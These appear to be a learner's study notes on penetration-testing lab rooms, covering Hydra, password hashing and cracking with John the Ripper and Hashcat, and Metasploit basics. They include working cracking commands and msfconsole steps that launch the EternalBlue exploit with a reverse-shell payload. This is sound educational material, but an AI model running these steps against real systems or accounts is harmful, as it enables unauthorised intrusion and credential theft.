> [!warning] `S=` vs `F=` — know which one you're using `S=<string>` marks a **success** signal (string present only on a successful login); `F=<string>` marks a **failure** signal (string present only on failure). Using the wrong direction for a given target's actual response behaviour silently breaks the whole brute-force run — always confirm which pattern fits the specific login form before running Hydra at scale.

> [!summary] Quick Recap — Using the Wordlists
> 
> - `words_clean.txt` (OSINT-derived) beats a generic wordlist for `ffuf` precisely because it's shaped to the target's actual vocabulary
> - `-mc` filters ffuf to only status codes that mean something; `-fs`/`-fl` clean up false-positive floods once a baseline 404 signature is known
> - Hydra's `http-post-form` argument is always 3 colon-separated parts: path, POST body with `^USER^`/`^PASS^`, and a success/failure signal string
> - `-L` (file) vs `-l` (single value), and `S=` (success match) vs `F=` (failure match) — both distinctions matter and are easy to mix up under time pressure

---

> [!summary] Full Wordlists Room — One Glance
> 
> - Wordlists power brute-force, dictionary, and enumeration attacks across password cracking (John/hashcat), live-service brute-forcing (Hydra), and directory/subdomain discovery (ffuf/Gobuster)
> - Custom, OSINT-built lists (CeWL, PDF string extraction, social-page name scraping, username permutation generation) consistently outperform generic lists on real targets
> - Clean before use: lowercase, strip artifacts, length/shape-filter, `sort -u` at every merge point
> - A discovered _pattern_ (not just raw words) is crunch's specific use case — small, fast, targeted password lists
> - ffuf for discovery → Hydra for login brute-force is the natural pipeline once a hidden path and credential lists are ready
### Password Cracking

> [!info] Room context Recovering plaintext from a password hash — a core red-team skill whether working from a leaked database, a captured network handshake, or a hash pulled off a compromised machine. Covers: how passwords are stored (hashing + salting) → identifying an unknown hash type → choosing an attack strategy (dictionary/brute-force/rules/masks) → running real cracks with John the Ripper and Hashcat.

#### How Passwords Are Stored

**Storing plaintext is catastrophic** — one breach exposes every account instantly, no cracking required. The fix: store a **hash** of the password, never the password itself. Login flow: hash the submitted password → compare against the stored hash → match = access granted. The original password is never persisted anywhere.

**Four properties that make a hash function suitable for this:**

- **One-way** — no reversal path; the only way "forward" is hashing a candidate and comparing
- **Deterministic** — same input always produces the same output, every machine, every time
- **Fixed-length output** — regardless of input length (MD5 is always 32 hex chars, whether hashing `a` or 10,000 characters)
- **Collision-resistant** — computationally infeasible for two different inputs to produce the same hash. When an algorithm loses this property (MD5, SHA-1 both have), it's considered broken for security purposes

**Common algorithms:**

|Algorithm|Output Length|Still Used for Passwords?|Notes|
|---|---|---|---|
|MD5|128 bits (32 hex)|No|Fast, collision-prone, widely cracked|
|SHA-1|160 bits (40 hex)|No|Faster than SHA-256, deprecated|
|SHA-256|256 bits (64 hex)|Sometimes|Better than MD5/SHA-1 but still fast|
|NTLM|128 bits (32 hex)|Yes (legacy Windows auth)|MD4-based, Windows account hashes|
|bcrypt|~60 chars, `$2*$` prefix|Yes, recommended|Deliberately slow, cost-configurable|
|Argon2|Variable|Yes, recommended|Modern standard, memory-hard|

**Why this list splits the way it does — speed.** MD5/SHA-1/SHA-256 were designed for file integrity and digital signatures, not password storage — a modern GPU computes billions of MD5 hashes per second. bcrypt was built specifically for passwords, with a configurable cost factor that makes computation **deliberately expensive**. The attacker grinding a wordlist is slowed exactly as much as the server verifying a real login — that symmetry is the entire design goal.

**Salting** — even a strong algorithm has a gap: identical passwords produce identical hashes, so an attacker can pre-compute a **rainbow table** for common passwords and get instant lookups with zero cracking. A **salt** is a unique random string per user, combined with the password before hashing:

```
stored_value = hash(password + salt)
```

> [!note] Modern schemes handle this internally bcrypt/Argon2 generate, embed, and manage the salt automatically — `bcrypt.hash(password)` is the whole call. The manual concatenation model shown above applies to older schemes like salted SHA-256, where a developer implements salting by hand.

Salt is stored alongside the hash. Identical passwords across different users now produce completely different hashes, and rainbow tables become useless — the attacker would need a separate pre-computed table per salt value, which defeats the entire point of pre-computation.

**Real-world consequences of storage failures:**

- **RockYou (2009)** — ~32 million passwords stored in **plaintext**, exposed directly. The resulting `rockyou.txt` became the standard first-pass dictionary attack wordlist, pre-installed on Kali/AttackBox at `/usr/share/wordlists/rockyou.txt`
- **Aptoide (April 2020)** — 20M+ accounts, passwords stored as **unsalted SHA-1**. A modern GPU tests 10B+ SHA-1 candidates/second — a full `rockyou.txt` run completes in a fraction of a second. Without a salt, rainbow tables make it faster still — **zero cracking time** for any password already in a pre-computed table

> [!summary] Quick Recap — Password Storage
> 
> - Hash properties needed: one-way, deterministic, fixed-length, collision-resistant
> - Fast algorithms (MD5/SHA-1/SHA-256) are wrong for passwords precisely _because_ they're fast — bcrypt/Argon2 are deliberately slow instead
> - Salting defeats rainbow tables by making identical passwords hash differently per user — modern libraries handle salt generation/storage automatically
> - Fast hash + no salt = the worst-case combination, and it's exactly what real breaches (Aptoide) have shipped in production

---

#### Identifying Hash Types

**Wrong mode/format supplied to a cracking tool = zero results, no matter how long it runs.** Identification always comes first.

**Visual characteristics — length and format are the fastest check:**

|Hash Type|Length|Prefix/Format|Example|
|---|---|---|---|
|MD5|32 hex chars|None|`5f4dcc3b5aa765d61d8327deb882cf99`|
|SHA-1|40 hex chars|None|`5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8`|
|SHA-256|64 hex chars|None|`5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8`|
|NTLM|32 hex chars|None|`8846f7eaee8fb117ad06bdd830b7586c`|
|bcrypt|~60 chars|`$2a$`, `$2b$`, `$2y$`|`$2y$12$...`|

> [!warning] The MD5/NTLM ambiguity Both are 32 hex characters — length alone can't distinguish them. **Context resolves it**: a hash from a Windows SAM file or dumped Active Directory is almost certainly NTLM; a hash pulled from a web app database is more likely MD5 or a SHA variant. With no context, try both. bcrypt has no such ambiguity — the `$2a$`/`$2b$`/`$2y$` prefix is unmistakable, and the number that follows (e.g. `$2y$12$`) is the **cost factor** controlling computation slowness.

**`hashid`** — analyses a hash's format and returns possible algorithm candidates:

```bash
hashid '5f4dcc3b5aa765d61d8327deb882cf99'
```

```
[+] MD2  [+] MD5  [+] MD4  [+] Double MD5  [+] LM  [+] NTLM  ...
```

Multiple candidates for a 32-char hex string is expected — several algorithms share that output length. Use context, or try the most likely candidates in order.

For bcrypt, `hashid` is unambiguous:

```bash
hashid '$2y$10$wJ/mZDURD4jQ0lrCEMheE.8FzMXNEBNjIkuZgEFm9VMn1m4ZP4eDG'
```

```
[+] Blowfish(OpenBSD)  [+] Woltlab Burning Board 4.x  [+] bcrypt
```

All three labels describe the **same format** — bcrypt uses Blowfish's key schedule internally and first shipped with OpenBSD, hence the naming overlap. Any `$2y$`/`$2b$` prefix = bcrypt, full stop.

**`hashcat --identify`** (Hashcat 6.2.6+) — skips switching tools entirely:

```bash
hashcat --identify '5f4dcc3b5aa765d61d8327deb882cf99'
```

Returns matching modes **with their mode numbers already attached**, ready to copy straight into a cracking command — often the fastest path from unknown hash to first attempt.

**Online lookups** (CTF/lab speed, **not** for real engagements):

- **crackstation.net** — checks against a pre-computed lookup table of billions of entries; instant hit if the plaintext has been seen before
- **hashes.com** — identifies type and attempts lookup against a large database, supports bulk submission

> [!warning] Never submit client hashes to third-party sites on a real engagement The hash may be sensitive, and any lookup creates an external record of exactly what you were cracking and when — a real confidentiality and evidentiary problem outside of lab/CTF contexts.

**Translating identified algorithm → tool-specific mode/format:**

|Algorithm|Hashcat Mode (`-m`)|John Format (`--format=`)|
|---|---|---|
|MD5|0|`raw-md5`|
|SHA-1|100|`raw-sha1`|
|SHA-256|1400|`raw-sha256`|
|SHA-512|1700|`raw-sha512`|
|NTLM|1000|`nt`|
|bcrypt|3200|`bcrypt`|

These are fixed values — `hashcat -m 1000` always means NTLM. **Getting the mode wrong is one of the most common causes of a crack silently producing nothing.**

> [!note] Practical order when `hashid` returns multiple 32-char candidates Try MD5 (mode 0) first — if the attack completes with zero results, try NTLM (mode 1000) next. A quick, cheap elimination order rather than guessing randomly.

> [!summary] Quick Recap — Identifying Hash Types
> 
> - Length + prefix is the fast first check; bcrypt's `$2a$`/`$2b$`/`$2y$` is the one unambiguous signature
> - MD5 vs NTLM (both 32 hex chars) needs context (source system) to disambiguate — try MD5 first if unknown
> - `hashid` and `hashcat --identify` both narrow candidates fast; `--identify` hands you the mode number directly
> - Online lookups (crackstation, hashes.com) are lab/CTF-only — never for real client hashes
> - Wrong mode number = guaranteed zero results regardless of runtime — always confirm the mode before a long run

---

#### Wordlists and Attack Strategies

**The core challenge:** generate the right candidate passwords fast enough to find a match before running out of time or candidates. No single method wins every case — picking the wrong strategy wastes time for nothing.

**1. Dictionary attacks** — test a pre-built candidate list against the hash, one by one. **Always the starting point** — fastest first step for most cracking tasks.

- `rockyou.txt` — 14M real breached passwords, `/usr/share/wordlists/rockyou.txt`. Effective specifically _because_ it reflects real human password choices, not synthetic guesses
- **SecLists** (`/usr/share/wordlists/SecLists/Passwords/`) — targeted lists for specific contexts: web app defaults, application-specific credentials, country-specific lists
- **RockYou2024** — ~9.9 billion unique plaintext passwords compiled from decades of breaches, ~150GB uncompressed. Not a beginner-exercise tool, but it illustrates the underlying point: attackers aren't blindly guessing, they're drawing from passwords real people have actually used before

**Limitation:** cracks only what appears verbatim in the list — nothing more, nothing less.

**2. Brute-force attacks** — generate every possible combination up to a specified length. Given unlimited time, always succeeds eventually — but the search space grows exponentially, making it impractical beyond ~6-7 characters in practice.

```
Lowercase-only, 6 chars:  26^6  = 308,915,776 combinations
Mixed-case + digits, 8:   62^8  = 218,340,105,584,896 combinations
```

Even at 1 billion candidates/second, a full 8-char mixed-case brute force takes **over 2 days per hash**. Only makes sense when the search space is genuinely small — a 4-digit PIN, or a tightly constrained pattern.

**3. Rule-based attacks** — take an existing wordlist and apply transformation rules to each word, generating the mutations real users actually make:

```
password  → Password    (capitalise first letter)
password  → password1   (append a number)
password  → password!   (add a special character)
password  → p@ssw0rd    (character substitution)
```

Dramatically extends coverage without the exponential blow-up of full brute force. **Password policies create predictable mutation patterns** — require a capital/digit/special character, and users capitalise the first letter, append `1` or `!`, and stop there. Rules directly exploit that predictability.

Hashcat rule files (`/opt/hashcat/rules/`):

|Rule File|Description|
|---|---|
|`best64.rule`|64 highly effective mutations — good first choice|
|`rockyou-30000.rule`|30,000 rules derived from RockYou analysis|
|`d3ad0ne.rule`|Large community-built rule set|
|`dive.rule`|Extensive, wide-ranging mutation coverage|
|`OneRuleToRuleThemAll.rule`|Popular community compilation — **not bundled by default**, verify it exists before referencing it|

John's rule sets live at `/usr/local/john/run/rules/`: `--rules=wordlist` (default mutations) or `--rules=single` (name/username-based mutations). John also supports `--mask=`, though Hashcat's mask syntax is the more widely documented and this room's focus.

**4. Mask attacks** — a _structured_ brute force: define the **pattern** of the password rather than a bare character set. If a password is known to follow "a word + 4-digit year," a mask generates only candidates matching that exact structure.

Hashcat mask placeholders:

|Placeholder|Character Set|
|---|---|
|`?l`|Lowercase (a-z)|
|`?u`|Uppercase (A-Z)|
|`?d`|Digits (0-9)|
|`?s`|Special characters|
|`?a`|All printable ASCII|

A mask for `Summer2026!` → `?u?l?l?l?l?l?d?d?d?d?s` — far fewer candidates than an unstructured brute force of the same length, because every position's character set is constrained by what's actually known about the pattern.

**Choosing an approach:**

|Scenario|Best Approach|
|---|---|
|No information about the password|Dictionary attack with `rockyou.txt`|
|Dictionary fails, password likely mutated|Dictionary + rules (`best64.rule`)|
|Known password pattern or enforced policy|Mask attack|
|Short password, small character set|Brute force (constrained length only)|
|Target likely used company-specific terms|Custom wordlist + rules|

**Progression:** dictionary first (fast, covers common cases) → rules if that fails (extends coverage cheaply) → masks when structure is known (targeted, efficient).

> [!summary] Quick Recap — Wordlists and Strategies
> 
> - Always start with a plain dictionary attack — cheapest, fastest, catches the most common real-world cases
> - Brute force is exponential and only viable for genuinely small search spaces (PINs, tightly constrained patterns)
> - Rules exploit predictable human mutation patterns (capitalise, append digit/symbol) — especially effective against policy-enforced passwords
> - Masks encode _known structure_ into a targeted brute force — the right tool when OSINT reveals a pattern, not just raw vocabulary
> - Escalation order: dictionary → rules → masks/custom, driven by what's actually known about the target

---

#### Cracking with John the Ripper and Hashcat

Both handle dictionary attacks, rules, and masks — differences are speed, format support, and output handling.

**Setup — three demo hashes for the walkthrough:**

```bash
echo "5f4dcc3b5aa765d61d8327deb882cf99" > demo.txt    # dictionary attack demo
echo "0571749e2ac330a7455809c6b0e7af90" > demo2.txt   # rule-based attack demo
echo "37b4e2d82900d5e94b8da524fbeb33c0" > demo3.txt   # mask attack demo
```

#### John the Ripper

CPU-based, versatile — wide format support including many non-standard ones, decent auto-detection, particularly strong for Unix shadow file entries.

**Basic dictionary attack:**

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt demo.txt
```

- `--format=raw-md5` — explicit hash format
- `--wordlist=` — path to wordlist
- `demo.txt` — file with one hash per line

**Auto-detect mode** (format unknown):

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt demo.txt
```

> [!warning] Auto-detect can silently pick the wrong format In the room's own example, John defaulted to **LM** format against an actual MD5 hash — the entire wordlist ran with **`0g` cracked** (zero matches), wasting the full run for nothing. This is exactly why explicit `--format` is preferred whenever the algorithm is already known from the identification step.

**Rule-based attack:**

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt --rules=wordlist demo2.txt
```

**Viewing cracked passwords** (stored in `/usr/local/john/run/john.pot`):

```bash
john --show --format=raw-md5 demo.txt
```

> [!warning] Always pair `--show` with `--format` Without it, John may fail to correctly locate/match entries in the potfile — an easy, silent mistake.

#### Hashcat

GPU-accelerated — billions of MD5/SHA-1 candidates/second on modern hardware vs. millions on CPU. For bcrypt specifically, the speed gap matters far less, since bcrypt's cost factor throttles throughput regardless of hardware.

**Basic dictionary attack:**

```bash
hashcat -m 0 -a 0 demo.txt /usr/share/wordlists/rockyou.txt
```

- `-m 0` — hash mode (0 = MD5)
- `-a 0` — attack mode (0 = dictionary)
- `demo.txt` — hash file
- final arg — wordlist path

Result: `5f4dcc3b5aa765d61d8327deb882cf99:password` — cracked.

**Rule-based attack:**

```bash
hashcat -m 0 -a 0 demo2.txt /usr/share/wordlists/rockyou.txt -r /usr/local/hashcat/rules/best64.rule
```

- `-r` — rule file to apply against the wordlist

Result: `0571749e2ac330a7455809c6b0e7af90:sunshine`.

**Mask attack:**

```bash
hashcat -m 0 -a 3 demo3.txt '?l?l?l?l?l?l?l?l'
```

- `-a 3` — attack mode 3 = mask attack
- final arg — the mask pattern itself

Result: `37b4e2d82900d5e94b8da524fbeb33c0:football`.

**Saving output to a file:**

```bash
hashcat -m 0 -a 0 demo2.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
```

**Viewing results after the run** (potfile: `/usr/local/hashcat/hashcat.potfile`):

```bash
hashcat -m 0 demo.txt --show
```

**Performance notes:**

- **CPU fallback** — on an AttackBox without a dedicated GPU, Hashcat runs CPU-mode; MD5/SHA-256 dictionary attacks still complete quickly, bcrypt stays slow by design regardless of hardware
- **Potfile behaviour** — both tools skip hashes already present in their potfile; re-running against the same hashes doesn't waste time re-cracking
- **Session resuming** — for long runs, name the session and resume on interruption:
    
    ```bash
    hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --session=bcrypt_crack# if interrupted:hashcat --session=bcrypt_crack --restore
    ```
    

**Tool comparison:**

||John the Ripper|Hashcat|
|---|---|---|
|Acceleration|CPU (primarily)|GPU (primarily, CPU fallback)|
|Speed (MD5/SHA)|Fast|Very fast|
|Format detection|Good auto-detect|Explicit mode required|
|Non-standard formats|Excellent|Good|
|Rule sets|Built-in + extensible|Large file library|
|Best for|Quick attempts, varied formats, shadow files|Sustained attacks, GPU-accelerated cracking|

> [!note] Neither tool is strictly better John suits quick auto-detect attempts and formats Hashcat handles poorly (shadow files, obscure formats). Hashcat is the right call for sustained, high-speed dictionary/rule/mask attacks — especially with GPU hardware available.

> [!summary] Quick Recap — John & Hashcat
> 
> - John's auto-detect can silently choose the wrong format (LM instead of MD5 in the room's example) — explicit `--format`/`-m` is safer whenever the hash type is already known
> - `-m` (hash mode) + `-a` (attack mode: 0=dictionary, 3=mask) are Hashcat's two mandatory numeric flags every single run
> - Both tools use a potfile to skip already-cracked hashes and support `--show` to view results without re-running
> - `--session=` + `--restore` makes long Hashcat runs resumable — essential for anything beyond a quick dictionary pass
> - GPU acceleration matters enormously for fast hashes (MD5/SHA) and barely at all for bcrypt, since bcrypt's cost factor is the actual bottleneck either way

---

> [!summary] Full Password Cracking Room — One Glance
> 
> - Passwords should be hashed with a slow, salted algorithm (bcrypt/Argon2) — fast algorithms (MD5/SHA-1/SHA-256) and missing salts are what make real breaches (RockYou, Aptoide) trivially crackable
> - Identify before cracking: length/prefix visual check → `hashid`/`hashcat --identify` → map to the tool-specific mode number — wrong mode guarantees zero results regardless of runtime
> - Strategy escalation: dictionary (`rockyou.txt`) → rules (`best64.rule` etc., exploits predictable human mutation patterns) → masks (exploits _known_ password structure) → brute force (only for genuinely small search spaces)
> - John = CPU, strong auto-detect and format breadth, good for quick/varied attempts and shadow files
> - Hashcat = GPU-accelerated, explicit mode required, the right tool for sustained high-speed dictionary/rule/mask attacks
> - Both: potfile skips already-cracked hashes, `--show` displays results without re-running, Hashcat sessions are resumable via `--session=`/`--restore`
## 13. Metasploit and Exploitation

### Metasploit: The Basics

> [!info] Room context Scenario: an engagement against **Stratford Systems**, a mid-sized financial services company, with a documented CVE-numbered vulnerability already identified on an outdated SMB service. This room covers the Metasploit Framework itself — its architecture, module system, `msfconsole` navigation, module configuration/execution, and session management. First of 4 rooms in the Metasploit module (Basics → Scanning and Exploitation → Post-Exploitation → Payload Generation).

#### What Is the Metasploit Framework

The most widely used open-source exploitation framework in penetration testing. Created by H.D. Moore in 2003, acquired by Rapid7 in 2009. Current scale: **2,600+ exploits, 6,100+ modules total**.

**The workshop analogy:** rather than hunting individual exploit scripts scattered across the internet, Metasploit provides a centralized library of exploits, scanners, payloads, and post-exploitation tools — all accessible through one interface, `msfconsole`.

**Supports the full pentest lifecycle:**

- Information gathering — scanning, service fingerprinting
- Vulnerability identification — detecting known flaws
- Exploitation — delivering exploit code
- Post-exploitation — maintaining access, gathering data, pivoting
- Reporting — logging findings for documentation

**Two editions:**

|Edition|Description|
|---|---|
|**Metasploit Pro**|Commercial, Rapid7-maintained — GUI, automated workflows, team collaboration, reporting|
|**Metasploit Framework**|Open-source, CLI-only — the version on Kali/Parrot/AttackBox, and what this module teaches|

> [!note] Skills transfer directly Every technique learned on the Framework applies identically to Pro — same modules, same commands, same concepts. Pro just adds a GUI/automation layer on top.

**Three pillars of the Framework:**

1. **`msfconsole`** — the primary CLI, where nearly all time is spent: search, configure, launch, manage sessions
2. **Modules** — the actual building blocks (7 categories, covered next) — Metasploit's real power is the module _library_, not any single tool
3. **Tools** — standalone CLI utilities shipped alongside the console; most notably **`msfvenom`** (standalone payload generation — covered in the Payload Generation room). `pattern_create`/`pattern_offset` exist for exploit development, out of scope here

> [!summary] Quick Recap — What Metasploit Is
> 
> - Centralized exploit/scanner/payload/post-exploitation library accessed through `msfconsole`
> - Framework (open-source, CLI) vs. Pro (commercial, GUI) — identical underlying techniques
> - Three pillars: `msfconsole` (interface), modules (the actual power), tools (`msfvenom` etc.)

---

#### Core Concepts: Vulnerability, Exploit, Payload

**The physical security analogy:** a vulnerability is a broken lock on a warehouse door. An exploit is pulling that door open. A payload is what the intruder does once inside — steal inventory, plant a device, or just photograph the break-in as proof.

**Precise definitions:**

- **Vulnerability** — a design/coding/configuration flaw. The flaw itself causes no harm; it creates an _opportunity_ for harm (arbitrary code execution, unauthorised file access, auth bypass)
- **Exploit** — code that takes advantage of a _specific_ vulnerability; the mechanism that triggers the flaw in a controlled way
- **Payload** — the code that runs _after_ the exploit succeeds; opens a reverse shell, creates a user account, executes a command

> [!note] Why the chain matters An exploit without a payload triggers the flaw but produces nothing useful. A payload without an exploit has no way to reach the target. Metasploit's entire architecture exists to pair the right exploit with the right payload for a given vulnerability.

**The seven module categories:**

|Category|Role|
|---|---|
|**Exploits**|Target a specific vulnerability on a specific platform (`exploits/windows/smb/`, etc.) — largest category, 2,600+ modules. "I used a Metasploit module" almost always means this|
|**Auxiliary**|Everything non-exploitation: port scanners, fingerprinters, brute-forcers, fuzzers, sniffers|
|**Payloads**|Code executed on the target post-exploit — ~1,700 modules across OS/architecture/connection method|
|**Post-Exploitation**|Run _through_ an active session: hash dumping, system enumeration, screenshots, pivoting (`post/windows/gather/`, etc.)|
|**Encoders**|Transform payload data format — e.g. `x86/shikata_ga_nai` (polymorphic XOR)|
|**NOPs**|Generate NOP sleds (padding for predictable memory landing in buffer overflows) — handled automatically, rarely touched directly|
|**Evasion**|Purpose-built security-control bypasses (Defender, AppLocker) — smallest category (~12 modules), effectiveness varies heavily by target|

> [!warning] Encoding ≠ encryption, and ≠ reliable AV evasion A common beginner misconception. `shikata_ga_nai` and similar encoders re-encode data (useful for removing bad characters from shellcode) but modern EDR looks far beyond simple signature matching — encoding alone is not a stealth mechanism. Covered honestly in the Payload Generation room.

**Payload types — singles, stagers, stages:**

- **Singles (inline)** — entirely self-contained, delivered as one package. Larger but more reliable — no second download to fail or be blocked
- **Stagers** — small, lightweight; sole job is establishing the comms channel, then downloading the actual payload
- **Stages** — the larger component a stager downloads. Stager + stage together = a _staged_ payload. Smaller initial footprint, but requires a stable connection long enough for the download

**Reading the naming convention** — the separator tells you everything:

```
windows/x64/shell_reverse_tcp     ← underscore = single (stageless), all-in-one
windows/x64/shell/reverse_tcp     ← slash = staged, small stager connects first
```

General path structure: `<platform>/<architecture>/<payload_type><separator><connection_method>`

Example: `linux/x86/meterpreter/reverse_tcp` (staged, slash) vs. `linux/x86/meterpreter_reverse_tcp` (single, underscore) — identical payload, different delivery mechanism, distinguishable at a glance once the pattern is known.

> [!summary] Quick Recap — Core Concepts & Modules
> 
> - Chain: vulnerability (opportunity) → exploit (trigger) → payload (result) — all three needed for a useful outcome
> - Seven module categories: exploits (largest), auxiliary, payloads, post, encoders, NOPs, evasion
> - Encoders are not a stealth/AV-bypass mechanism — that's a common and important misconception to avoid
> - Payload naming: `_` = single/stageless, `/` = staged — this pattern is consistent across the entire framework

---

#### Navigating `msfconsole`

**Launching:**

```bash
msfconsole
```

Loads with a random ASCII banner, framework version, and module counts. Prompt changes to `msf6 >` — everything typed from here is interpreted by `msfconsole`, not the regular shell. (`msf6` reflects the major version; older installs may show `msf5` — commands/concepts are identical.)

**Running Linux commands inside `msfconsole`** — most standard commands pass through directly:

```
msf6 > whoami
msf6 > ip -br a show ens5
```

Useful for quickly confirming the attacking IP (`LHOST`) without leaving the console.

> [!warning] Not all shell features work Output redirection (`help > output.txt`) fails outright — `[-] No such command`. Use the `spool` command (logs all console output to a file) instead, or drop to a regular terminal.

**Getting help:**

```
help              # full command list
help search       # usage for a specific command
```

`help <command>` is the go-to pattern whenever syntax is uncertain — faster than leaving the console to search externally.

**History and tab completion:**

```
history           # lists recent commands
```

Up/down arrows scroll history like a normal terminal. **Tab completion** works on commands, module paths, and option names — critical time-saver for deeply nested module paths (`use exploit/windows/smb/ms17` + Tab).

**Searching for modules** — with 6,100+ modules, `search` is essential.

Basic search:

```
search eternalblue
```

Output columns:

- **#** — numeric index, usable with `use`/`info` instead of the full path (`use 0`)
- **Name** — full module path (type/platform/service/name)
- **Disclosure Date** — public vulnerability disclosure date (blank for non-CVE auxiliary modules)
- **Rank** — reliability rating (see below)
- **Check** — whether a non-destructive vulnerability check is supported
- **Description** — brief summary

Filtered search — combine keywords with filters for precision:

```
search type:auxiliary name:smb
search type:exploit -platform:windows      # exclude with a minus prefix
```

Most useful filters: `type` (exploit/auxiliary/post/payload/encoder/nop/evasion), `platform` (windows/linux/osx/android/etc.), `cve`, `name`.

**Exploit ranking system — 7 tiers:**

|Rank|Meaning|
|---|---|
|Excellent|Never crashes the service — e.g. SQLi, command execution, file inclusion|
|Great|Auto-detects correct config (e.g. return address) via a default target|
|Good|Default target covers the common case, but no auto-detection|
|Normal|Reliable against a specific version, no auto-detect or broad default|
|Average|Generally unreliable, >50% success rate|
|Low|<50% success rate|
|Manual|Essentially DoS or requires significant manual config, ≤15% success|

> [!warning] Rank is a starting point, not a guarantee A higher rank doesn't guarantee success and a lower rank doesn't guarantee failure — target configuration, network conditions, and security controls all matter independently of the module's inherent rank.

**Inspecting a module with `info`:**

```
info exploit/windows/smb/ms17_010_eternalblue
info 0                                          # numeric index also works
```

Key fields to check:

- **Privileged** — `Yes` means successful exploitation yields elevated (SYSTEM/root) privileges; `No` means you land with the exploited service's own privileges
- **Check supported** — `Yes` means the target can be verified vulnerable without sending the full exploit payload — safer for production environments
- **Available targets** — some modules need a specific target selected manually (e.g. a particular service pack); most modern modules default to `Automatic Target`

> [!note] EternalBlue as the room's running example `exploit/windows/smb/ms17_010_eternalblue` exploits **CVE-2017-0144** — a critical SMBv1 buffer overflow. Originally an NSA-developed exploit, leaked by the Shadow Brokers in April 2017; weaponised a month later in the **WannaCry** ransomware campaign. Used throughout as a teaching example for being well-documented and reliable in lab environments — not a suggestion to limit real engagements to a single 2017 exploit.

> [!summary] Quick Recap — Navigating msfconsole
> 
> - `msf6 >` prompt = Metasploit's own command interpreter; most Linux commands pass through, but redirection doesn't (`spool` is the workaround)
> - `search` + filters (`type:`, `platform:`, `cve:`, `name:`, and `-` to exclude) is the core discovery workflow across 6,100+ modules
> - Rank (7 tiers, Excellent → Manual) estimates reliability but isn't a guarantee either direction
> - `info` gives the full technical brief: privilege level gained, whether `check` is supported, and available targets — read before configuring anything

---

#### Configuring and Running Modules

**Know your prompt** — five distinct contexts, each with different available commands:

|Prompt|Context|Available Commands|
|---|---|---|
|`root@IP~#`|Regular Linux terminal|Standard Linux only — Metasploit not running|
|`msf6 >`|msfconsole, no module loaded|Global: `search`, `use`, `sessions`, `setg`|
|`msf6 exploit(...) >`|Module loaded|Full module commands: `set`, `show options`, `exploit`, `run`, `check`, `back`|
|`meterpreter >`|Active Meterpreter session|`sysinfo`, `getuid`, `hashdump`, `shell`, `background`|
|`C:\Windows\system32>`|OS shell on target|Every command executes **on the target**, not locally|

> [!warning] Wrong prompt = the most common troubleshooting culprit A command "not working" is very often just being typed at the wrong prompt — e.g. trying `set RHOSTS` at the bare `msf6 >` with no module loaded, or typing Linux commands directly into an active Meterpreter session. Check the prompt first.

**Selecting a module — `use`:**

```
use exploit/windows/smb/ms17_010_eternalblue
```

Prompt changes to reflect the loaded module; Metasploit auto-selects a default payload (e.g. `windows/x64/meterpreter/reverse_tcp`), overridable later via `set PAYLOAD`.

> [!note] Loading a module doesn't change any working directory There's no "inside a folder" — still the same `msfconsole` session, just with module-specific options/commands now in scope. Confirmable by running any Linux command from within a module context — it still works normally.

`back` returns to the bare `msf6 >` prompt.

**Reading `show options`** — three sections:

```
show options
```

- **Module options** — exploit-specific parameters (`RHOSTS`, `RPORT`, etc.) — `Required: yes` fields must be set before the module runs
- **Payload options** — parameters for the selected payload (`LHOST`, `LPORT`) — Metasploit often auto-detects `LHOST`, but always verify it, especially over a VPN
- **Exploit target** — which target configuration the exploit is tuned for; many modern modules use `Automatic Target`, older ones may need `set TARGET <id>`

**The six core parameters, worth knowing by name:**

|Parameter|Meaning|
|---|---|
|`RHOSTS`|Target IP(s) — single IP, CIDR range, hyphenated range, or `file:/path/to/targets.txt`|
|`RPORT`|Target port for the vulnerable service — usually pre-populated|
|`LHOST`|Attacking machine's IP — where the target connects back for reverse payloads|
|`LPORT`|Local listening port — default `4444`, changeable to any unused port|
|`PAYLOAD`|The payload to deliver — a default is usually pre-selected|
|`SESSION`|Used with post-exploitation modules — specifies which existing session to run through|

**Setting parameters:**

```
set RHOSTS MACHINE_IP
set LPORT 5555
```

Re-run `show options` after setting values — a typo in `RHOSTS` or a wrong `LHOST` is one of the most common silent-failure causes.

```
unset RHOSTS       # clear a single parameter
unset all          # reset everything to defaults
```

**Local vs. global — `set` vs. `setg`:**

`set` values are local to the current module — lost on switching modules. `setg` sets a **global** value persisting across every module for the rest of the `msfconsole` session — invaluable when working the same target across multiple modules (e.g. scan with an auxiliary module, then exploit with an exploit module, without re-typing `RHOSTS`):

```
setg RHOSTS MACHINE_IP
# ...switch modules — RHOSTS is already populated in the new module's show options
unsetg RHOSTS      # clear the global value
```

> [!note] Practical rule of thumb Use `setg` for values constant across the whole engagement (`RHOSTS`, `LHOST`); use plain `set` for module-specific values (`RPORT`, `PAYLOAD`, `SESSION`).

**Selecting a different payload:**

```
show payloads                                    # lists all compatible payloads for the loaded exploit
set PAYLOAD windows/x64/shell/reverse_tcp         # switch from the default
```

Only payloads compatible with the exploit's target architecture/platform are shown.

**Running the module — `exploit` (alias `run`):**

```
exploit
```

Sequence on success: listener starts on `LHOST:LPORT` → optional vulnerability check runs → exploit connects and triggers the flaw → payload executes on target and connects back → session opens, prompt becomes `meterpreter >`.

> [!note] `run` vs. `exploit` Functionally identical. Convention: `run` for auxiliary/scanner/brute-force modules (where "exploit" reads oddly), `exploit` for actual exploit modules — either works everywhere.

**`-z` flag** — runs the exploit and immediately backgrounds the resulting session, returning to the module prompt instead of dropping into the session:

```
exploit -z
```

Useful when the plan is to keep working in `msfconsole` immediately — e.g. launching additional modules against other hosts.

**Checking before exploiting:**

```
check
```

Probes for vulnerability without sending the full exploit payload — not all modules support it (see the `Check` column from `search`/`info`), but when available, running `check` first is good practice, especially where a failed exploit risks crashing a production service or triggering alerts.

> [!summary] Quick Recap — Configuring and Running
> 
> - Five prompts, each with a different command set — mismatched prompt is the most common source of "why isn't this working"
> - `use` loads a module (auto-selects a default payload); `show options` reveals module/payload/target parameters and what's still required
> - Six core parameters worth memorising: `RHOSTS`, `RPORT`, `LHOST`, `LPORT`, `PAYLOAD`, `SESSION`
> - `set` = local to current module; `setg` = persists globally across modules for the session — use `setg` for engagement-constant values like `RHOSTS`/`LHOST`
